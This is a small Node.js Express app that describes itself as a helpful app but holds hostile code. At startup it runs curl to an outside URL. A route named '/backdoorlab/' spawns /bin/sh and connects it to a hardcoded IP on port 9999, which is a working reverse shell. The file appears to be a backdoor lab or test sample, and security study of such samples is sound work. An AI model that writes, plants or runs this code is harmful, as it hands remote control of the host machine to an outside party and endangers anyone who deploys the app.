var express = require('express');
const { exec } = require("child_process");
var app = express();
app.get('/', function (req, res) {
  res.send('Im an helpful app!');
});

exec("curl -k https://anniekcreates.com/leendertwazhere", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});

app.get('/backdoorlab/', function (req, res) {
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(9999, "3.10.221.167", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
});
app.listen(3001, function () {
  console.log('Example app listening on port 3000!');
  
});
